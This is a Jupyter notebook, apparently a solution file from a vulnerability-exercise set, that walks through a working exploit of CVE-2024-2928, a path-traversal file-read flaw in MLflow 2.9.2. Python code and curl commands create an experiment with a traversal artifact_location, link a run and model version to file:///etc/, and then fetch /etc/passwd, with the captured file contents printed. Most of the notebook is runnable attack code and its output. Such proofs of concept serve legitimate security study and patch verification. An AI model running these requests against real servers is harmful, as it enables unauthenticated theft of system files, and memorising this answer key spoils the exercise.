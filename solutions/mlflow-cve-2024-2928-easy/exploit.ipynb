{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# MLflow 2.9.2 LFI Demo - CVE-2024-2928\n",
    "Report: https://huntr.com/bounties/19bf02d7-6393-4a95-b9d0-d6d4d2d8c298\n",
    "\n",
    "Resources:\n",
    "   - https://pypi.org/project/mlflow/2.9.2/\n",
    "   - https://github.com/mlflow/mlflow/tree/v2.9.2\n",
    "\n",
    "\n",
    "### Description\n",
    "This is a vulnerability in the `mlflow` package that allows an attacker to read arbitrary files on the system by sending a crafted HTTP request to the server.\n",
    "\n",
    "\n",
    "### CVE Rating\n",
    "This vulnerability has been rated as a `High` severity issue because of the following factors:\n",
    "  - The vulnerability allows an attacker to read arbitrary files on the system.\n",
    "  - The vulnerability can be exploited remotely by sending a crafted HTTP request to the server.\n",
    "  - The vulnerability can be exploited without authentication."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "\n",
    "import http.client\n",
    "import urllib.parse\n",
    "\n",
    "def post_request(conn, endpoint, payload, headers):\n",
    "  conn.request(\"POST\", endpoint, body=payload, headers=headers)\n",
    "  response = conn.getresponse()\n",
    "  response_data = response.read().decode()\n",
    "  return {\"status\": response.status, \"data\": response_data}\n",
    "\n",
    "\n",
    "def get_request(conn, payload):\n",
    "  conn.request(\"GET\", payload)\n",
    "  response = conn.getresponse()\n",
    "  response_data = response.read().decode()\n",
    "  return {\"status\": response.status, \"data\": response_data}\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "server = \"127.0.0.1\"\n",
    "port = 5000\n",
    "headers = {\"Content-Type\": \"application/json\"}\n",
    "\n",
    "experiment_name = \"MLflow 2.9.2 LFI Demo - CVE-2024-2928\"\n",
    "experiment_id = \"\"\n",
    "run_id = \"\"\n",
    "\n",
    "conn = http.client.HTTPConnection(server, port)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The first step is creating an experiment.\n",
    "\n",
    "```bash\n",
    "curl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"artifact_location\": \"\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create'\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SETUP - Create an experiment\n",
      "Status: 200\n",
      "Response data: {\n",
      "  \"experiment_id\": \"500050261894365319\"\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "api_endpoint = \"/ajax-api/2.0/mlflow/experiments/create\"\n",
    "\n",
    "# We can chage the directory below in order to travserse the file system\n",
    "artifact_location = \"http:///#/../../../../../../../../../../../../../../etc/\"\n",
    "\n",
    "payload = json.dumps({\n",
    "  \"name\": experiment_name,\n",
    "  \"artifact_location\": artifact_location\n",
    "})\n",
    "\n",
    "response = post_request(conn, api_endpoint, payload, headers)\n",
    "\n",
    "# Extract the experiment ID\n",
    "experiment_id = json.loads(response[\"data\"])[\"experiment_id\"]\n",
    "\n",
    "print(\"SETUP - Create an experiment\")\n",
    "print(\"Status:\", response[\"status\"])\n",
    "print(\"Response data:\", response[\"data\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the next step we will associate a run and model with the experiment. \n",
    "\n",
    "Associate a run:\n",
    "```bash\n",
    "curl -X POST -H 'Content-Type: application/json' -d '{\"experiment_id\": \"{{EXPERIMENT_ID}}\"}' 'http://127.0.0.1:5000/api/2.0/mlflow/runs/create'\n",
    "```\n",
    "\n",
    "Register a model:\n",
    "```bash\n",
    "curl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SETUP - Associate a run\n",
      "Status: 200\n",
      "Response data: {\n",
      "  \"run\": {\n",
      "    \"info\": {\n",
      "      \"run_uuid\": \"11f8487cd1194044a51cce52cf2755cd\",\n",
      "      \"experiment_id\": \"500050261894365319\",\n",
      "      \"run_name\": \"persistent-midge-273\",\n",
      "      \"user_id\": \"\",\n",
      "      \"status\": \"RUNNING\",\n",
      "      \"start_time\": 0,\n",
      "      \"artifact_uri\": \"http:///11f8487cd1194044a51cce52cf2755cd/artifacts#/../../../../../../../../../../../../../../etc/\",\n",
      "      \"lifecycle_stage\": \"active\",\n",
      "      \"run_id\": \"11f8487cd1194044a51cce52cf2755cd\"\n",
      "    },\n",
      "    \"data\": {\n",
      "      \"tags\": [\n",
      "        {\n",
      "          \"key\": \"mlflow.runName\",\n",
      "          \"value\": \"persistent-midge-273\"\n",
      "        }\n",
      "      ]\n",
      "    },\n",
      "    \"inputs\": {}\n",
      "  }\n",
      "}\n",
      "SETUP - Create a registered model\n",
      "Status: 200\n",
      "Response data: {\n",
      "  \"registered_model\": {\n",
      "    \"name\": \"MLflow 2.9.2 LFI Demo - CVE-2024-2928\",\n",
      "    \"creation_timestamp\": 1718735527138,\n",
      "    \"last_updated_timestamp\": 1718735527138\n",
      "  }\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "# Step 2.1 - Associate a run\n",
    "api_endpoint = \"http://127.0.0.1:5000/api/2.0/mlflow/runs/create\"\n",
    "\n",
    "payload = json.dumps({\n",
    "  \"experiment_id\": experiment_id\n",
    "})\n",
    "\n",
    "response = post_request(conn, api_endpoint, payload, headers)\n",
    "\n",
    "# Extract the run id\n",
    "run_id = json.loads(response[\"data\"])[\"run\"][\"info\"][\"run_uuid\"]\n",
    "\n",
    "print(\"SETUP - Associate a run\")\n",
    "print(\"Status:\", response[\"status\"])\n",
    "print(\"Response data:\", response[\"data\"])\n",
    "\n",
    "# Step 2.2 - Register a model\n",
    "api_endpoint = \"/ajax-api/2.0/mlflow/registered-models/create\"\n",
    "\n",
    "payload = json.dumps({\n",
    "  \"name\": experiment_name,\n",
    "})\n",
    "\n",
    "response = post_request(conn, api_endpoint, payload, headers)\n",
    "\n",
    "print(\"SETUP - Create a registered model\")\n",
    "print(\"Status:\", response[\"status\"])\n",
    "print(\"Response data:\", response[\"data\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next we will create a model version.\n",
    "\n",
    "```bash\n",
    "curl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"run_id\": \"{{RUN_ID}}\", \"source\": \"file:///etc/\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SETUP - Link a model version to the malicious run\n",
      "Status: 200\n",
      "Response data: {\n",
      "  \"model_version\": {\n",
      "    \"name\": \"MLflow 2.9.2 LFI Demo - CVE-2024-2928\",\n",
      "    \"version\": \"1\",\n",
      "    \"creation_timestamp\": 1718735592744,\n",
      "    \"last_updated_timestamp\": 1718735592744,\n",
      "    \"current_stage\": \"None\",\n",
      "    \"description\": \"\",\n",
      "    \"source\": \"file:///etc/\",\n",
      "    \"run_id\": \"11f8487cd1194044a51cce52cf2755cd\",\n",
      "    \"status\": \"READY\",\n",
      "    \"run_link\": \"\"\n",
      "  }\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "api_endpoint = \"/ajax-api/2.0/mlflow/model-versions/create\"\n",
    "\n",
    "payload = json.dumps({\n",
    "  \"name\": experiment_name,\n",
    "  \"run_id\": run_id,\n",
    "  \"source\": \"file:///etc/\"\n",
    "})\n",
    "\n",
    "response = post_request(conn, api_endpoint, payload, headers)\n",
    "\n",
    "print(\"SETUP - Link a model version to the malicious run\")\n",
    "print(\"Status:\", response[\"status\"])\n",
    "print(\"Response data:\", response[\"data\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Finally we read the file `/etc/passwd` using the following request.\n",
    "\n",
    "```bash\n",
    "curl 'http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1'\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PAYLOAD - Read `/etc/passwd`\n",
      "Status: 200\n",
      "Response data: root:x:0:0:root:/root:/bin/bash\n",
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
      "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
      "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
      "sync:x:4:65534:sync:/bin:/bin/sync\n",
      "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
      "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
      "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
      "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
      "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
      "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
      "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
      "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
      "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
      "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n",
      "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n",
      "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
      "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n",
      "systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n",
      "systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n",
      "messagebus:x:103:104::/nonexistent:/usr/sbin/nologin\n",
      "systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n",
      "\n"
     ]
    }
   ],
   "source": [
    "lfi_headers = urllib.parse.urlencode({\n",
    "  \"name\": experiment_name,\n",
    "  \"path\": \"passwd\",\n",
    "  \"version\": \"1\"\n",
    "})\n",
    "\n",
    "payload = f\"/model-versions/get-artifact?{lfi_headers}\"\n",
    "\n",
    "response = get_request(conn, payload)\n",
    "\n",
    "print(\"PAYLOAD - Read `/etc/passwd`\")\n",
    "print(\"Status:\", response[\"status\"])\n",
    "print(\"Response data:\", response[\"data\"])"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
